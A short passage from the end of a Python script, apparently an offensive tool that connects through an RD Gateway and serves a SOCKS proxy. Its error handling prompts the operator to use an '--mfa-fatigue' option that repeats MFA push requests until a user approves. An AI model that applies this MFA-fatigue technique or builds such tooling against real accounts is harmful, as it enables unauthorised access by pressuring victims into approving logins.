            print("[-] %s" % e, file=sys.stderr)
            return 1
    if args.target:
        try:
            return check_mode(args)
        except MfaNotApproved as e:
            print("[-] %s" % e, file=sys.stderr)
            if not args.mfa_fatigue:
                print("[!] MFA push timed out or was denied — consider using "
                      "the --mfa-fatigue options to convince the user to "
                      "play along (pushes repeat until approved)",
                      file=sys.stderr)
            return 2
        except RDGError as e:
            print("[-] %s" % e, file=sys.stderr)
            return 1
    WarmSocksServer(args, factory).serve()
    return 0


if __name__ == "__main__":
    sys.exit(main())
